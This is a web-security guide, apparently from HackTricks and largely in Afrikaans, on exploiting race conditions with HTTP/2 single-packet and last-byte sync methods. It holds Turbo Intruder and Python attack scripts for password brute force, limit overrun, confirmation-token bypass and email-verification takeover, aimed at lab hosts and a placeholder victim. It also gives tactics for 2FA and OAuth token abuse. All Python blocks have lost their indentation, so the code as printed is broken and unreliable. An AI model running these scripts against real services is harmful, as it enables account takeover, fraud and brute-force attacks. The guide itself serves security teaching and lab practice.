# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Vir ’n diep begrip van hierdie tegniek, kyk die oorspronklike verslag by [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Verbetering van Race Condition-aanvalle

Die grootste struikelblok om voordeel te trek uit race conditions is om seker te maak dat meerdere requests terselfdertyd verwerk word, met **baie min verskil in hul verwerkingstye — idealiter minder as 1ms**.

Hier volg ’n paar tegnieke vir die sinkronisering van requests:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Ondersteun die stuur van twee requests oor ’n enkele TCP-verbinding, wat die impak van netwerkjitter verminder. As gevolg van variasies aan die bedienerkant mag twee requests egter nie genoeg wees vir ’n konsekwente race condition exploit nie.
- **HTTP/1.1 'Last-Byte Sync'**: Maak dit moontlik om die meeste dele van 20–30 requests vooraf te stuur, terwyl ’n klein fragment teruggehou word, wat dan saamgestuur word en ’n gelyktydige aankoms by die bediener bewerkstellig.

Voorbereiding vir Last-Byte Sync behels:

1. Stuur headers en body data minus die finale byte sonder om die stream te beëindig.
2. Pauzeer vir 100ms na die aanvanklike stuur.
3. Skakel TCP_NODELAY af om Nagle's algorithm te gebruik vir die saamvoeging van finale frames.
4. Pings stuur om die verbinding te warm te maak.

Die daaropvolgende stuur van die teruggehoue frames behoort te lei tot hul aankoms in ’n enkele packet, verifieerbaar met Wireshark. Hierdie metode geld nie vir static files nie, wat gewoonlik nie by RC-aanvalle betrokke is nie.

### Aanpassing by Server-argitektuur

Om die teiken se argitektuur te verstaan is kritiek. Front-end servers kan requests anders routeer, wat timing beïnvloed. Preemptiewe verbinding-warming aan die bedienerkant, deur onbelangrike requests, kan versoektye normaliseer.

#### Handling Session-Based Locking

Frameworks soos PHP se session handler serialiseer requests per session, wat moontlik kwesbaarhede kan verberg. Deur verskillende session tokens vir elke request te gebruik kan hierdie probleem omseil word.

#### Overcoming Rate or Resource Limits

As connection warming nie effektief is nie, kan jy webservers se rate- of resource-limietvertraging doelbewus veroorsaak deur ’n vloed van dummy requests, wat die single-packet attack kan vergemaklik deur ’n bediener-aan-die-kant vertraging te induseer wat gunstig is vir race conditions.

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Jy kan die request stuur na **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), jy kan in die request die waarde wat jy wil brute force verander vir **`%s`** soos in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` en dan die **`examples/race-single-packer-attack.py`** uit die dropdown kies:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

As jy verskillende waardes gaan stuur, kan jy die kode wysig met hierdie een wat ’n wordlist vanaf die clipboard gebruik:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> As die web HTTP2 nie ondersteun nie (slegs HTTP1.1) gebruik `Engine.THREADED` of `Engine.BURP` in plaas van `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: As jy 'n request na 1 endpoint moet stuur en daarna verskeie na ander endpoints om die RCE te trigger, kan jy die `race-single-packet-attack.py` script verander met iets soos:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Dit is ook beskikbaar in **Repeater** via die nuwe '**Send group in parallel**' opsie in Burp Suite.
- Vir **limit-overrun** kan jy net **dieselfde request 50 keer** by die groep voeg.
- Vir **connection warming** kan jy **byvoeg** aan die **begin** van die **groep** 'n paar **requests** na 'n nie-statiese deel van die webbediener.
- Vir **delaying** die proses **tussen** die verwerking van **een request en 'n ander** in 2 substates stappe, kan jy **voeg ekstra requests tussen** albei requests.
- Vir 'n **multi-endpoint** RC kan jy begin om die **request** te stuur wat **na die versteekte toestand gaan** en dan net ná dit **50 requests** stuur wat **die versteekte toestand uitbuit**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Geautomatiseerde python-skrip**: Die doel van hierdie skrip is om die e-pos van 'n gebruiker te verander terwyl dit voortdurend verifieer totdat die verifikasie-token van die nuwe e-pos by die laaste e-pos aankom (dit is omdat in die kode daar 'n RC was waar dit moontlik was om 'n e-pos te wysig maar die verifikasie aan die ou een gestuur is omdat die veranderlike wat die e-pos aandui reeds met die eerste een gevul was).\
Wanneer die woord "objetivo" in die ontvangde e-posse gevind word, weet ons dat ons die verifikasie-token van die veranderde e-pos ontvang het en ons beëindig die aanval.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: enjin- en gating-notas

- Enjin-keuse: gebruik `Engine.BURP2` op HTTP/2 teikens om die single‑packet attack te trigger; val terug na `Engine.THREADED` of `Engine.BURP` vir HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: queue many copies with `gate='race1'` (or per‑attempt gates), which withholds the tail of each request; `openGate('race1')` flushes all tails together so they arrive nearly simultaneously.
- Diagnostiek: negatiewe tydstempels in Turbo Intruder dui aan dat die server geantwoord het voordat die request heeltemal gestuur is, wat oorlap bewys. Dit word verwag in ware races.
- Konneksie-opwarming: stuur eers 'n ping of 'n paar onskadelike requests om tydberekeninge te stabiliseer; skakel opsioneel `TCP_NODELAY` af om die samestelling van die finale frames aan te moedig.

### Verbetering van die Single Packet Attack

In die oorspronklike navorsing word verduidelik dat hierdie attack 'n limiet van 1,500 bytes het. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it was explained how it's possible to extend the 1,500-byte limitation of the single packet attack to the **65,535 B window limitation of TCP by using IP layer fragmentation** (deur 'n enkele pakket in verskeie IP-pakkette te verdeel en dit in 'n ander volgorde te stuur), wat voorkom dat die pakket heraangestel word totdat al die fragmente die server bereik het. Hierdie tegniek het die navorser in staat gestel om ongeveer 10,000 requests in ongeveer 166ms te stuur.

Let wel dat alhoewel hierdie verbetering die attack meer betroubaar maak in RC wat honderde/duisende pakkette vereis om terselfdertyd te arriveer, dit ook sagtewarebeperkings kan hê. Sommige gewilde HTTP-servers soos Apache, Nginx en Go het 'n streng `SETTINGS_MAX_CONCURRENT_STREAMS` instelling van 100, 128 en 250. However, other like NodeJS and nghttp2 has it unlimited.\
Dit beteken basies dat Apache slegs 100 HTTP-verbindinge vanaf 'n enkele TCP-verbinding sal oorweeg (wat hierdie RC attack beperk).

Jy kan voorbeelde van hierdie tegniek vind in die repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Voor die vorige navorsing is hier 'n paar payloads gebruik wat net probeer het om die pakkette so vinnig as moontlik te stuur om 'n RC te veroorsaak.

- **Repeater:** Kyk na die voorbeelde uit die vorige afdeling.
- **Intruder**: Stuur die **request** na **Intruder**, stel die **number of threads** op **30** in die **Options menu**, kies as payload **Null payloads** en genereer **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Metodologie**

### Limit-overrun / TOCTOU

Dit is die mees basiese tipe race condition waar **vulnerabilities** voorkom op plekke wat die **aantal kere wat jy 'n aksie kan uitvoer** beperk. Soos om dieselfde afslagkode in 'n webwinkel verskeie kere te gebruik. 'n Baie eenvoudige voorbeeld is te vinde in [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) of in [**this bug**](https://hackerone.com/reports/759247)**.**

Daar is baie variasies van hierdie soort aanval, insluitend:

- Inløs van 'n geskenkkaart meerdere kere
- Beoordeel 'n produk meerdere kere
- Onttrekking of oordrag van kontant bo jou rekeningbalans
- Hergebruik van 'n enkele CAPTCHA-oplossing
- Omseil van 'n anti-brute-force rate limit

### **Verborge substates**

Die uitbuiting van ingewikkelde race conditions behels dikwels om voordeel te trek uit kortgeleë geleenthede om met verborge of **onbedoelde machine substates** te interaksioneer. Hier is hoe om dit aan te pak:

1. **Identifiseer potensiële verborge substates**
- Begin deur endpoints te identifiseer wat kritieke data wysig of daarmee interaksioneer, soos user profiles of password reset processes. Fokus op:
- **Storage**: Gee voorkeur aan endpoints wat server-side persistent data manipuleer bo dié wat data client-side hanteer.
- **Action**: Kyk na operasies wat bestaande data verander, wat meer geneig is om uitbuitbare toestande te skep in vergelyking met dié wat nuwe data byvoeg.
- **Keying**: Suksesvolle aanvalle behels gewoonlik operasies wat op dieselfde identifier gesleutel is, bv. gebruikersnaam of reset token.
2. **Voer aanvanklike probing uit**
- Toets die geïdentifiseerde endpoints met race condition attacks en let op enige afwykings van verwagte uitkomste. Onverwagte antwoorde of veranderinge in application-gedrag kan 'n vulnerability aandui.
3. **Demonstrate the Vulnerability**
- Beperk die aanval tot die minimale aantal requests wat nodig is om die vulnerability te exploit — dikwels net twee. Hierdie stap kan meervoudige pogings of automatisering vereis weens die presiese timing.

### Tydsgevoelige Aanvalle

Presisie in die timing van requests kan vulnerabilities openbaar, veral wanneer voorspelbare metodes soos timestamps gebruik word vir security tokens. Byvoorbeeld, die genereer van password reset tokens gebaseer op timestamps kan identiese tokens toelaat vir gelyktydige requests.

**To Exploit:**

- Gebruik presiese timing, soos 'n single packet attack, om gelyktydige password reset requests te stuur. Identiese tokens dui op 'n vulnerability.

**Example:**

- Vra twee password reset tokens terselfdertyd aan en vergelyk hulle. Ooreenstemmende tokens dui op 'n fout in tokengenerering.

**Kyk na hierdie** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **om dit te probeer.**

## Verborge substates gevallestudies

### Betaal & voeg 'n item by

Kyk na hierdie [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) om te sien hoe om te **betaal** in 'n winkel en **'n ekstra item by te voeg** waarvoor jy **nie hoef te betaal nie**.

### Bevestig ander e-posse

Die idee is om 'n e-posadres te **verifieer en dit terselfdertyd na 'n ander een te verander** om uit te vind of die platform die nuwe een verifieer.

### Verander e-pos na 2 e-posadresse Cookie-gebaseerd

Volgens [**this research**](https://portswigger.net/research/smashing-the-state-machine) was Gitlab op hierdie wyse kwesbaar vir 'n takeover omdat dit die email verification token van een e-pos na die ander kon stuur.

**Kyk na hierdie** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **om dit te probeer.**

### Verborge Database-state / Confirmation Bypass

As 2 verskillende writes gebruik word om inligting by 'n database te voeg, is daar 'n klein tydperk waar slegs die eerste data in die database geskryf is. Byvoorbeeld, wanneer 'n gebruiker geskep word, kan die gebruikersnaam en password geskryf word en daarna die token om die nuutgeskepte rekening te bevestig geskryf word. Dit beteken dat vir 'n kort tyd die token om 'n rekening te bevestig null is.

Daarom kan die registrasie van 'n rekening en die stuur van verskeie requests met 'n leë token (`token=` of `token[]=` of enige ander variasie) om die rekening onmiddellik te bevestig, toelaat om 'n rekening te bevestig waarvoor jy nie die e-pos beheer nie.

**Kyk na hierdie** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **om dit te probeer.**

### Bypass 2FA

Die volgende pseudo-code is kwesbaar vir race condition omdat in 'n baie klein tyd die **2FA nie afgedwing word nie** terwyl die session geskep word:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 ewige persistentie

Daar is verskeie [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Hierdie dienste laat jou toe om 'n toepassing te skep en gebruikers te verifieer wat deur die provider geregistreer is. Om dit te doen, sal die **client** die **permit your application** moet gee om toegang tot sommige van hul data binne die **OAUth provider** te kry.\
So, tot dusver net 'n gewone login met google/linkedin/github... waar jy 'n bladsy te sien kry wat sê: "_Aansoek \<InsertCoolName> wil toegang hê tot jou inligting, wil jy dit toelaat?_" 

#### Race Condition in `authorization_code`

Die **probleem** verskyn wanneer jy dit **aanvaar** en dit outomaties 'n **`authorization_code`** na die kwaadwillige toepassing stuur. Dan misbruik hierdie toepassing 'n **Race Condition in die OAUth service provider om meer as een AT/RT te genereer** (_Authentication Token/Refresh Token_) vanaf die **`authorization_code`** vir jou rekening. Basies sal dit die feit misbruik dat jy die toepassing toegang tot jou data gegee het om **verskeie rekeninge te skep**. As jy dan **stop om die toepassing toegang tot jou data te gee, sal een paar AT/RT verwyder word, maar die ander sal steeds geldig wees**.

#### Race Condition in `Refresh Token`

Sodra jy 'n **geldig RT** verkry het, kan jy probeer om dit te **misbruik om verskeie AT/RT te genereer** en **selfs as die gebruiker die permissies kanselleer** vir die kwaadwillige toepassing om sy data te bereik, sal **verskeie RTs steeds geldig wees.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) vind jy 'n PoC in Java om websocket-boodskappe in **parallel** te stuur om **Race Conditions ook in Web Sockets** te misbruik.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Begin met die amptelike voorbeeld en tune `config()` (thread count) vir concurrency; dit is dikwels meer reliable as batching on a single connection wanneer jy server‑side state across WS handlers race. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Verwysings

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
